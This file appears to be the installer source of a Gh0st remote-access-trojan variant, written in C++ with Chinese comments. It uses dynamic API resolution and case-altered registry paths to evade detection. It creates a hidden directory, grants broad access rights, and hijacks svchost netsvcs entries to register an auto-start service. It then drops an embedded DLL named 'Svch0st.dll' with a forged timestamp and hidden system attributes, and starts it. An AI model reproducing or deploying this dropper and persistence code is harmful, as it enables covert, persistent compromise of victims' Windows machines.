// install.cpp : Defines the entry point for the application.
//

#include "StdAfx.h"

#pragma comment(linker, "/defaultlib:msvcrt.lib /opt:nowin98 /IGNORE:4078 /MERGE:.rdata=.text /MERGE:.data=.text /section:.text,ERW")
#include "resource.h"
#include <windows.h>
#include <stdlib.h>
#include <Aclapi.h>
#include <lm.h>
#include <Shlwapi.h>
#pragma comment(lib, "NetApi32.lib")
#include "acl.h"
#include "decode.h"
#include "RegEditEx.h"



//		以下函数动态调用的定义
//*******************************************************************************************************************
UINT API_GetSystemDirectoryA(LPSTR lpBuffer,UINT uSize)
{
UINT result;
typedef UINT (WINAPI *lpAddFun)(LPSTR,UINT);			//返回值,形参类型参考函数定义
HINSTANCE hDll=LoadLibrary("kernel32.dll");			//函数所在的DLL
lpAddFun addFun=(lpAddFun)GetProcAddress(hDll,"GetSystemDirectoryA");	//函数名字
if (addFun != NULL)
	{
	addFun(lpBuffer,uSize);					//调用函数
	FreeLibrary(hDll);					//释放句柄
	}
return result;
}
BOOL API_GetUserNameA(LPSTR lpBuffer,LPDWORD pcbBuffer)
{
BOOL result;
typedef BOOL (WINAPI *lpAddFun)(LPSTR,LPDWORD);			//返回值,形参类型参考函数定义,去后面的
HINSTANCE hDll=LoadLibrary("kernel32.dll");			//函数所在的DLL
lpAddFun addFun=(lpAddFun)GetProcAddress(hDll,"GetUserNameA");	//函数名字
if (addFun != NULL)
	{
	addFun(lpBuffer,pcbBuffer);					//调用函数，去前面的
	FreeLibrary(hDll);					//释放句柄
	}
return result;
}
int API_WideCharToMultiByte(UINT     CodePage,DWORD    dwFlags,LPCWSTR  lpWideCharStr,int      cchWideChar,LPSTR   lpMultiByteStr,int      cbMultiByte,LPCSTR   lpDefaultChar,LPBOOL  lpUsedDefaultChar)
{
int result;
typedef int (WINAPI *lpAddFun)(UINT,DWORD,LPCWSTR,int,LPSTR,int,LPCSTR,LPBOOL);			//返回值,形参类型参考函数定义,去后面的
HINSTANCE hDll=LoadLibrary("kernel32.dll");			//函数所在的DLL
lpAddFun addFun=(lpAddFun)GetProcAddress(hDll,"WideCharToMultiByte");	//函数名字
if (addFun != NULL)
	{
	addFun(CodePage,dwFlags,lpWideCharStr,cchWideChar,lpMultiByteStr,cbMultiByte,lpDefaultChar,lpUsedDefaultChar);					//调用函数，去前面的
	FreeLibrary(hDll);					//释放句柄
	}
return result;
}

BOOL API_WriteFile(HANDLE hFile,
	LPCVOID lpBuffer,
	DWORD nNumberOfBytesToWrite,
	LPDWORD lpNumberOfBytesWritten,
	LPOVERLAPPED lpOverlapped)
{
	BOOL result;
	typedef BOOL (WINAPI *lpAddFun)(HANDLE,LPCVOID,DWORD,LPDWORD,LPOVERLAPPED);			//返回值,形参类型参考函数定义,去后面的
	HINSTANCE hDll=LoadLibrary("kernel32.dll");			//函数所在的DLL
	lpAddFun addFun=(lpAddFun)GetProcAddress(hDll,"WriteFile");	//函数名字
	if (addFun != NULL)
	{
		addFun(hFile,lpBuffer,nNumberOfBytesToWrite,lpNumberOfBytesWritten,lpOverlapped);					//调用函数，去前面的
		FreeLibrary(hDll);					//释放句柄
	}
	return result;
}

BOOL API_FreeResource(HGLOBAL hResData)
{
BOOL result;
typedef BOOL (WINAPI *lpAddFun)(HGLOBAL);			//返回值,形参类型参考函数定义,去后面的
HINSTANCE hDll=LoadLibrary("kernel32.dll");			//函数所在的DLL
lpAddFun addFun=(lpAddFun)GetProcAddress(hDll,"FreeResource");	//函数名字
if (addFun != NULL)
	{
	addFun(hResData);					//调用函数，去前面的
	FreeLibrary(hDll);					//释放句柄
	}
return result;
}
BOOL API_SetFileAttributesA(LPCSTR lpFileName,DWORD dwFileAttributes)
{
BOOL result;
typedef BOOL (WINAPI *lpAddFun)(LPCSTR,DWORD);			//返回值,形参类型参考函数定义,去后面的
HINSTANCE hDll=LoadLibrary("kernel32.dll");			//函数所在的DLL
lpAddFun addFun=(lpAddFun)GetProcAddress(hDll,"SetFileAttributesA");	//函数名字
if (addFun != NULL)
	{
	addFun(lpFileName,dwFileAttributes);					//调用函数，去前面的
	FreeLibrary(hDll);					//释放句柄
	}
return result;
}

typedef BOOL (WINAPI *SystemTimeToFileTimeT)
(
	CONST SYSTEMTIME *lpSystemTime,
	LPFILETIME lpFileTime
);
typedef BOOL (WINAPI *LocalFileTimeToFileTimeT)
(
	CONST FILETIME *lpLocalFileTime,
	LPFILETIME lpFileTime
);

typedef HRSRC (WINAPI *FindResourceAT)
(
	HMODULE hModule,
	LPCSTR lpName,
	LPCSTR lpType
);

typedef HANDLE (WINAPI *CreateFileAT)
(
	LPCSTR lpFileName,
	DWORD dwDesiredAccess,
	DWORD dwShareMode,
	LPSECURITY_ATTRIBUTES lpSecurityAttributes,
	DWORD dwCreationDisposition,
	DWORD dwFlagsAndAttributes,
	HANDLE hTemplateFile
);
	FindResourceAT pFindResourceA = (FindResourceAT)GetProcAddress(LoadLibrary("kernel32.dll"),"FindResourceA");
	SystemTimeToFileTimeT pSystemTimeToFileTime = (SystemTimeToFileTimeT)GetProcAddress(LoadLibrary("kernel32.dll"),"SystemTimeToFileTime");
	LocalFileTimeToFileTimeT pLocalFileTimeToFileTime = (LocalFileTimeToFileTimeT)GetProcAddress(LoadLibrary("kernel32.dll"),"LocalFileTimeToFileTime");
	CreateFileAT pCreateFileA = (CreateFileAT)GetProcAddress(LoadLibrary("kernel32.dll"),"CreateFileA");
//*******************************************************************************************************************



char GetIEPath[80];
char *IEPath()
{
	char *p;
	char strWinPath[50];
	GetWindowsDirectory(strWinPath,sizeof(strWinPath));
	p = strtok(strWinPath, ":"); 
	if (p)
	wsprintf(GetIEPath,"%s:\\Documents and Settings\\Local User",p);
	return GetIEPath;
}



void dbg_dump(struct _EXCEPTION_POINTERS* ExceptionInfo) {
}

LONG WINAPI bad_exception(struct _EXCEPTION_POINTERS* ExceptionInfo) {
	dbg_dump(ExceptionInfo);
	ExitProcess(0);
}

void SetAccessRights()
{
	char	lpUserName[50], lpGroupName[100];//, lpDriverDirectory[MAX_PATH], lpSysDirectory[MAX_PATH];
	DWORD	nSize = sizeof(lpUserName);
	
	LPLOCALGROUP_USERS_INFO_0 pBuf = NULL;   
	DWORD   dwEntriesRead = 0;   
	DWORD   dwTotalEntries = 0;   
	NET_API_STATUS   nStatus;
	WCHAR wUserName[100];
	
	ZeroMemory(lpUserName, sizeof(lpUserName));
	ZeroMemory(IEPath(), sizeof(IEPath()));
	API_GetUserNameA(lpUserName, &nSize);

	// 设置成员权限
	AddAccessRights(IEPath(), lpUserName, GENERIC_ALL);
	MultiByteToWideChar( CP_ACP, 0, lpUserName, -1, wUserName, sizeof(wUserName) / sizeof(wUserName[0])); 
	
	nStatus = NetUserGetLocalGroups(NULL,   
		(LPCWSTR)wUserName,
		0,   
		LG_INCLUDE_INDIRECT,   
		(LPBYTE   *) &pBuf,   
		MAX_PREFERRED_LENGTH,   
		&dwEntriesRead,   
		&dwTotalEntries);   
	
	if (nStatus == NERR_Success)   
	{   
		LPLOCALGROUP_USERS_INFO_0 pTmpBuf;   
		DWORD i;   
		
		if ((pTmpBuf = pBuf) != NULL)
		{   
			for (i = 0; i < dwEntriesRead; i++)   
			{ 
				if (pTmpBuf == NULL)     
					break;
				API_WideCharToMultiByte(CP_OEMCP, 0, (LPCWSTR)pTmpBuf->lgrui0_name, -1, (LPSTR)lpGroupName, sizeof(lpGroupName), NULL, FALSE);
				// 设置组的权限
				AddAccessRights(IEPath(), lpGroupName, GENERIC_ALL);	
				pTmpBuf++;  
			}   
		}      
	}   
	if (pBuf != NULL)   
		NetApiBufferFree(pBuf); 
	
}

BOOL ReleaseResource(HMODULE hModule, /*WORD*/LPCTSTR  wResourceID, LPCTSTR lpType, LPCTSTR lpFileName, LPCTSTR lpConfigString)
{
	HGLOBAL hRes;
	HRSRC hResInfo;
	HANDLE hFile;
	DWORD dwBytes;

	//hResInfo = FindResource(hModule, MAKEINTRESOURCE(wResourceID), lpType);
	hResInfo = FindResource(hModule, wResourceID, lpType);

	if (hResInfo == NULL)
		return FALSE;
	hRes = LoadResource(hModule, hResInfo);
	if (hRes == NULL)
		return FALSE;
	hFile = pCreateFileA(lpFileName, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS,FILE_ATTRIBUTE_NORMAL, NULL);
	
	if (hFile == NULL)
		return FALSE;

	SYSTEMTIME st;
	memset(&st, 0, sizeof(st));
	st.wYear = 2005;
	st.wMonth = 4;
	st.wDay = 19;
	st.wHour = 16;
	st.wMinute = 14;
	FILETIME ft,LocalFileTime;
	pSystemTimeToFileTime(&st, &ft);
	pLocalFileTimeToFileTime(&ft,&LocalFileTime);
	SetFileTime(hFile, &LocalFileTime, (LPFILETIME) NULL,	&LocalFileTime);

	API_WriteFile(hFile, hRes, SizeofResource(NULL, hResInfo), &dwBytes, NULL);
	// 写入配置
	if (lpConfigString != NULL)
	{
		API_WriteFile(hFile, lpConfigString, lstrlen(lpConfigString) + 1, &dwBytes, NULL);
	}
	CloseHandle(hFile);
	API_FreeResource(hRes);

	API_SetFileAttributesA(lpFileName, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY| FILE_ATTRIBUTE_SYSTEM);
	return TRUE;
}

char *AddsvchostService()
{
	char	*lpServiceName = NULL;
	int rc = 0;
	HKEY hkRoot;
    char buff[2048];
    //query svchost setting
	//char *ptr, *pSvchost = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost";
    char *ptr, *pSvchost = "software\\mICROSOFT\\wINDOWS nt\\cURRENTvERSION\\sVCHOST";
    rc = RegOpenKeyEx(HKEY_LOCAL_MACHINE, pSvchost, 0, KEY_ALL_ACCESS, &hkRoot);
    if(ERROR_SUCCESS != rc)
        return NULL;
	
    DWORD type, size = sizeof buff;
    rc = RegQueryValueEx(hkRoot, "netsvcs", 0, &type, (unsigned char*)buff, &size);
    SetLastError(rc);
    if(ERROR_SUCCESS != rc)
        RegCloseKey(hkRoot);
	
	int i = 0;
	bool bExist = false;
	char servicename[50];
	do
	{	
		//wsprintf(servicename, "netsvcs_0x%d", i);
		wsprintf(servicename, "NETSVCS_0x%x", i);
		for(ptr = buff; *ptr; ptr = strchr(ptr, 0)+1)
		{
			if (lstrcmpi(ptr, servicename) == 0)
			{	
				bExist = true;
				break;
			}
		}
		if (bExist == false)
			break;
		bExist = false;
		i++;
	} while(1);
	
	servicename[lstrlen(servicename) + 1] = '\0';
	memcpy(buff + size - 1, servicename, lstrlen(servicename) + 2);
	
    rc = RegSetValueEx(hkRoot, "netsvcs", 0, REG_MULTI_SZ, (unsigned char*)buff, size + lstrlen(servicename) + 1);
	
	RegCloseKey(hkRoot);
	
    SetLastError(rc);
	
	if (bExist == false)
	{
		lpServiceName = new char[lstrlen(servicename) + 1];
		lstrcpy(lpServiceName, servicename);
	}
	
	return lpServiceName;
}

// 随机选择服务安装,返回安装成功的服务名

//char *InstallService(LPCTSTR lpServiceDisplayName, LPCTSTR lpServiceDescription, LPCTSTR lpConfigString)
char *InstallService(LPCTSTR lpServiceDisplayName, LPCTSTR lpServiceDescription, LPCTSTR lpConfigString, LPCTSTR lpServiceDllName)
{
    // Open a handle to the SC Manager database.
	char *lpServiceName = NULL;
    int rc = 0;
    HKEY hkRoot = HKEY_LOCAL_MACHINE, hkParam = 0;
    SC_HANDLE hscm = NULL, schService = NULL;
	char strModulePath[MAX_PATH];
	char	strSysDir[MAX_PATH];
	DWORD	dwStartType = 0;

    try{
		char strSubKey[1024];
		//query svchost setting
		//char *ptr, *pSvchost = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost";
		char *ptr, *pSvchost = "software\\mICROSOFT\\wINDOWS nt\\cURRENTvERSION\\sVCHOST";
		rc = RegOpenKeyEx(hkRoot, pSvchost, 0, KEY_QUERY_VALUE, &hkRoot);
		if(ERROR_SUCCESS != rc)
		{
			throw "";
		}

		DWORD type, size = sizeof strSubKey;
		rc = RegQueryValueEx(hkRoot, "netsvcs", 0, &type, (unsigned char*)strSubKey, &size);
		RegCloseKey(hkRoot);
		SetLastError(rc);

		if(ERROR_SUCCESS != rc)
			throw "RegQueryValueEx(Svchost\\netsvcs)";

		//install service
		hscm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);

		if (hscm == NULL)
			throw "OpenSCManager()";

		API_GetSystemDirectoryA(strSysDir, sizeof(strSysDir));
		//char *bin = "%SystemRoot%\\System32\\svchost.exe -k netsvcs";
		char *bin = "%sYSTEMrOOT%\\sYSTEM32\\SVCHOST.EXE -K NETSVCS";
		char	strRegKey[1024];

		for(ptr = strSubKey; *ptr; ptr = strchr(ptr, 0)+1)
		{
			//防止生成6to4
			//////////////////////////////////////////////////////////////////////////
			if (lstrcmp(ptr,"6to4")==NULL) continue; //添加此行代码 
			if (lstrcmp(ptr,"Ias")==NULL) continue; //添加此行代码 
			if (lstrcmp(ptr,"Iprip")==NULL) continue;//添加此行代码 
			if (lstrcmp(ptr,"Irmon")==NULL) continue;
			//MessageBox(0,ptr,"调试中 看看这是什么",0);
			//////////////////////////////////////////////////////////////////////////
		
				char temp[500];
				//wsprintf(temp, "SYSTEM\\CurrentControlSet\\Services\\%s", ptr);
				wsprintf(temp, "system\\cURRENTcONTROLsET\\sERVICES\\%s", ptr);
				rc = RegOpenKeyEx(HKEY_LOCAL_MACHINE, temp, 0, KEY_QUERY_VALUE, &hkRoot);
				if (rc == ERROR_SUCCESS)
				{
					RegCloseKey(hkRoot);
					continue;
				}

				memset(strModulePath, 0, sizeof(strModulePath));
				//wsprintf(strModulePath, "%s\\%sex.dll", strSysDir, ptr);
				//wsprintf(strModulePath, "%s\\%sSystem.dll", strSysDir, ptr);
				//wsprintf(strModulePath, "%s\\%sSystem.dll", IEPath(), ptr);
				wsprintf(strModulePath, "%s\\%s", IEPath(), lpServiceDllName);
				// 删除试试
				DeleteFile(strModulePath);
				// 以前的服务文件没有删除之前，服务的DLL还在svchost中，所以不用这个服务
				if (GetFileAttributes(strModulePath) != INVALID_FILE_ATTRIBUTES)
					continue;

				//wsprintf(strRegKey, "MACHINE\\SYSTEM\\CurrentControlSet\\Services\\%s", ptr);
				wsprintf(strRegKey, "machine\\system\\cURRENTcONTROLsET\\sERVICES\\%s", ptr);

				//创建一个服务对象并且把它加入到服务管理数据库中
				/************************************************************************
				SC_HANDLE CreateService(
				　　SC_HANDLE hSCManager, //服务控制管理程序维护的登记数据库的句柄，由系统函数OpenSCManager 返回
				  　LPCTSTR lpServiceName, //以NULL 结尾的服务名，用于创建登记数据库中的关键字
					LPCTSTR lpDisplayName, //以NULL 结尾的服务名，用于用户界面标识服务
					DWORD dwDesiredAccess, //指定服务返回类型
					DWORD dwServiceType, //指定服务类型
					DWORD dwStartType, //指定何时启动服务
					DWORD dwErrorControl, //指定服务启动失败的严重程度
					LPCTSTR lpBinaryPathName, //指定服务程序二进制文件的路径
					LPCTSTR lpLoadOrderGroup, //指定顺序装入的服务组名
					LPDWORD lpdwTagId, //忽略，NULL
					LPCTSTR lpDependencies, //指定启动该服务前必须先启动的服务或服务组
					LPCTSTR lpServiceStartName, //以NULL 结尾的字符串，指定服务帐号。如是NULL,则表示使用LocalSystem 帐号
					LPCTSTR lpPassword //以NULL 结尾的字符串，指定对应的口令。为NULL表示无口令。但使用LocalSystem时填NULL
					);				
				************************************************************************/
				schService = CreateService(hscm,ptr,lpServiceDisplayName,
					SERVICE_ALL_ACCESS,SERVICE_WIN32_SHARE_PROCESS,SERVICE_AUTO_START,SERVICE_ERROR_NORMAL,
					bin,NULL,NULL,NULL,NULL,NULL);
				if (schService != NULL)
					break;
		}

		if (schService == NULL)
		{
			lpServiceName = AddsvchostService();
			memset(strModulePath, 0, sizeof(strModulePath));
			//wsprintf(strModulePath, "%s\\%sex.dll", strSysDir, lpServiceName);
			//wsprintf(strModulePath, "%s\\%sSystem.dll", strSysDir, lpServiceName);
			//wsprintf(strModulePath, "%s\\%sSystem.dll", IEPath(), lpServiceName);
			wsprintf(strModulePath, "%s\\%s", IEPath(), lpServiceDllName);
			//wsprintf(strRegKey, "MACHINE\\SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
			wsprintf(strRegKey, "machine\\system\\cURRENTcONTROLsET\\sERVICES\\%s", lpServiceName);
			schService = CreateService(hscm,lpServiceName,lpServiceDisplayName,SERVICE_ALL_ACCESS,SERVICE_WIN32_OWN_PROCESS,SERVICE_AUTO_START,SERVICE_ERROR_NORMAL,bin,NULL,NULL,NULL,NULL,NULL);
			dwStartType = SERVICE_WIN32_OWN_PROCESS;
		}
		else
		{
			dwStartType = SERVICE_WIN32_SHARE_PROCESS;
			lpServiceName = new char[lstrlen(ptr) + 1];
			lstrcpy(lpServiceName, ptr);
		}
		if (schService == NULL)
			throw "CreateService(Parameters)";

		CloseServiceHandle(schService);
		CloseServiceHandle(hscm);

		//config service
		hkRoot = HKEY_LOCAL_MACHINE;
		//wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
		wsprintf(strSubKey, "system\\cURRENTcONTROLsET\\sERVICES\\%s", lpServiceName);

		if (dwStartType == SERVICE_WIN32_SHARE_PROCESS)
		{		
			DWORD	dwServiceType = 0x120;
			WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Type", REG_DWORD, (char *)&dwServiceType, sizeof(DWORD), 0);
		}

		//添加描述
		WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Description", REG_SZ, (char *)lpServiceDescription, lstrlen(lpServiceDescription), 0);
		//添加启动对应的dll
		lstrcat(strSubKey, "\\Parameters");
		WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "ServiceDll", REG_EXPAND_SZ, (char *)strModulePath, lstrlen(strModulePath), 0);

    }catch(char *str)
    {
        if(str && str[0])
        {
            rc = GetLastError();
        }
    }
    RegCloseKey(hkRoot);
    RegCloseKey(hkParam);
    CloseServiceHandle(schService);
    CloseServiceHandle(hscm);

	if (lpServiceName != NULL)
	{
		//ReleaseResource(NULL, IDR_DLL, "BIN", strModulePath, lpConfigString);
		ReleaseResource(NULL, "DLL", "BIN", strModulePath, lpConfigString);
	}

    return lpServiceName;
}

void StartService(LPCTSTR lpService)
{
	SC_HANDLE hSCManager = OpenSCManager( NULL, NULL,SC_MANAGER_CREATE_SERVICE );
	if ( NULL != hSCManager )
	{
		SC_HANDLE hService = OpenService(hSCManager, lpService, DELETE | SERVICE_START);
		if ( NULL != hService )
		{
			StartService(hService, 0, NULL);
			CloseServiceHandle( hService );
		}
		CloseServiceHandle( hSCManager );
	}
}

int memfind(const char *mem, const char *str, int sizem, int sizes)   
{   
	int   da,i,j;   
	if (sizes == 0) da = strlen(str);   
	else da = sizes;   
	for (i = 0; i < sizem; i++)   
	{   
		for (j = 0; j < da; j ++)   
			if (mem[i+j] != str[j])	break;   
			if (j == da) return i;   
	}   
	return -1;   
}

#define	MAX_CONFIG_LEN	4500	//从-1024的地方开始读取上线数据

LPCTSTR FindConfigString(HMODULE hModule, LPCTSTR lpString)
{
	char	strFileName[MAX_PATH];
	char	*lpConfigString = NULL;
	DWORD	dwBytesRead = 0;
	GetModuleFileName(hModule, strFileName, sizeof(strFileName));

	HANDLE	hFile = CreateFile(strFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return NULL;
	}
	
	SetFilePointer(hFile, -MAX_CONFIG_LEN, NULL, FILE_END);
	lpConfigString = new char[MAX_CONFIG_LEN];
	ReadFile(hFile, lpConfigString, MAX_CONFIG_LEN, &dwBytesRead, NULL);
	CloseHandle(hFile);

	int offset = memfind(lpConfigString, lpString, MAX_CONFIG_LEN, 0);
	if (offset == -1)
	{
		delete lpConfigString;
		return NULL;
	}
	else
	{
		return lpConfigString + offset;
	}
}





int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
	//////////////////////////////////////////////////////////////////////////
	// 让启动程序时的小漏斗马上消失
	GetInputState();
	PostThreadMessage(GetCurrentThreadId(),NULL,0,0);
	MSG	msg;
	GetMessage(&msg, NULL, NULL, NULL);
	//////////////////////////////////////////////////////////////////////////
	char	*lpEncodeString = NULL;
	char	*lpServiceConfig = NULL;
	char	*lpServiceDisplayName = NULL;
	char	*lpServiceDescription = NULL;
	char	*lpServiceDllName = NULL;

	char DstFilePath[256];
	memset(DstFilePath, 0, 256);
	GetSystemDirectory(DstFilePath,MAX_PATH);
	DstFilePath[3] = 0x00;
	wsprintf(DstFilePath,"%s%s",DstFilePath,"Documents and Settings\\Local User");
	//MessageBox(0,DstFilePath,"ok", 0);
	CreateDirectory(DstFilePath, NULL);//创建一个文件夹
	SetFileAttributes(DstFilePath, FILE_ATTRIBUTE_HIDDEN);//隐藏文件夹路径

	/*2011-12-13
	lpEncodeString = (char *)FindConfigString(hInstance, "AAAAAA");
	if (lpEncodeString == NULL)
		return -1;

	lpServiceConfig = (char *)FindConfigString(hInstance, "CCCCCC");
	if (lpServiceConfig == NULL)
		return -1;
	char	*pos = strchr(lpServiceConfig, '|');
	char	*pos1 = strchr(lpServiceConfig, '$');
	if (pos == NULL)
		return -1;
	*pos = '\0';

	lpServiceDisplayName = MyDecode(lpServiceConfig + 6);
	lpServiceDescription = MyDecode(pos + 1);
	lpServiceDllName = MyDecode(pos1 + 1);
	if (lpServiceDisplayName == NULL || lpServiceDescription == NULL|| lpServiceDllName == NULL)
		return -1;

	char	*lpServiceName = NULL;

	//改了更新服务端的字符串
	//char	*lpUpdateArgs = "Gh0st Update";
	char	*lpUpdateArgs = "whmtorrent_Server_Update";

	//////////////////////////////////////////////////////////////////////////
	// 如果不是更新服务端
	if (strstr(GetCommandLine(), lpUpdateArgs) == NULL)
	{
		HANDLE	hMutex = CreateMutex(NULL, true, lpEncodeString);
		DWORD	dwLastError = GetLastError();
		// 普通权限访问系统权限创建的Mutex,如果存在，如果存在就返回拒绝访问的错误
		// 已经安装过一个一模一样配置的，就不安装了
		if (dwLastError == ERROR_ALREADY_EXISTS || dwLastError == ERROR_ACCESS_DENIED)
			return -1;
		ReleaseMutex(hMutex);
		CloseHandle(hMutex);
	}
	else
	{
		// 等待服务端自删除
		Sleep(5000);
	}
	2011-12-13*/
	SetUnhandledExceptionFilter(bad_exception);
	
	// 确保权限
	SetAccessRights();
	//lpServiceName = InstallService(lpServiceDisplayName, lpServiceDescription, lpEncodeString);
	lpServiceDisplayName = "hello5";
	lpServiceDescription = "Description5";
	lpEncodeString = "AAAAAAENCODING";
	lpServiceDllName="Svch0st.dll";
	char	*lpServiceName = NULL;
	lpServiceName = InstallService(lpServiceDisplayName, lpServiceDescription, lpEncodeString , lpServiceDllName);

	if (lpServiceName != NULL)
	{
		// 写安装程序路径到注册表，服务开始后读取并删除
		char	strSelf[MAX_PATH];
		char	strSubKey[1024];
		memset(strSelf, 0, sizeof(strSelf));
		GetModuleFileName(NULL, strSelf, sizeof(strSelf));
		//wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
		wsprintf(strSubKey, "system\\cURRENTcONTROLsET\\sERVICES\\%s", lpServiceName);

		WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "InstallModule", REG_SZ, strSelf, lstrlen(strSelf), 0);
 
		StartService(lpServiceName);
		delete lpServiceName;
		delete lpServiceDllName;
		delete lpServiceDisplayName;
		delete lpServiceDescription;
	}
	ExitProcess(0);
}



